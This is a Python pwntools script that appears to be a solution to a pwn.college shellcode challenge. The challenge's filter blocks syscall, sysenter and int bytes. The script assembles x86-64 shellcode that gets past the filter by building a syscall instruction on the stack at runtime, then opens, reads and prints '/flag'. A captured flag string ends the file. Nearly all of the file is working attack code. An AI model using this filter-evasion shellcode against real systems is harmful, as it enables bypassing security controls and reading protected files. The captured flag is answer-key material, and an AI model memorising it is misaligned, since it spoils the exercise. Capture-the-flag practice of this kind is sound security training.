'''
This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.
'''



from pwn import *
context.arch = 'amd64'

sc = asm('''

	xor esi, esi             ; //Clear esi (used for system call arguments)
	xor edx, edx             ; //Clear edx (used for system call arguments)
	lea edi, [eip + path]
    xor eax, eax 
    mov al, 2                    ; //Syscall number for open() 
    push 0xC3050e
    inc qword ptr [rsp]
    call rsp 

    mov edi, eax                 ; //Store the file descriptor in rdi
    xor eax, eax                 ; //Syscall number for read()
    push rsp
  	pop rsi		                 ; //Buffer to read into (rsp)
    mov dl, 128                  ; //Number of bytes to read
    push 0xC3050e
    inc qword ptr [rsp]
    call rsp 

    mov edx, eax                 ; //Number of bytes read is returned in rax, use it for write()
    mov al, 1                    ; //Syscall number for write()
    mov dil, 1                   ; //File descriptor for stdout (1)
    push 0xC3050e
    inc qword ptr [rsp]
    call rsp 

    mov al, 60                   ; //Syscall number for exit()
    xor edi, edi                 ; //Exit code 0
    push 0xC3050e
    inc qword ptr [rsp]
    call rsp 

    path:
    .string "/flag"

	''')

payload = b'\x00'*(8192-len(sc))+sc 

print(disasm(sc))
print(len(payload))

# elf = ELF.from_bytes(sc)

# elf.write(elf.entrypoint, sc)

# # Save as an ELF binary
# elf.save('shellcode_executable')

'''
pwn.college{ESpEQVqKDLSXfjRCpvBQ2UhPu86.QXyIjMsETM5kzW}
'''
